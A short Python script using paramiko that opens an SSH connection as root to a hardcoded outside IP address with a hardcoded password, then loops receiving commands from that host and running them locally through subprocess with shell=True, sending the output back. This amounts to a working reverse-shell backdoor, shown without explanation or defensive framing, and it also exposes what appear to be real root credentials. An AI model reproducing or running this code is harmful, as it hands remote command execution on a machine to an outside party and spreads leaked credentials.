import threading
import paramiko
import subprocess


def ssh_R_commandd(ip, username, password, command):
    client = paramiko.SSHClient()
    # client.load_host_keys('~/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=username, password=password)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(4096)

        while True:
            command = ssh_session.recv(4096)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
                break
    client.close()
    return


if __name__ == '__main__':
    ssh_R_commandd('118.27.20.115', 'root', '181964327181ltao', 'ClientConnected')
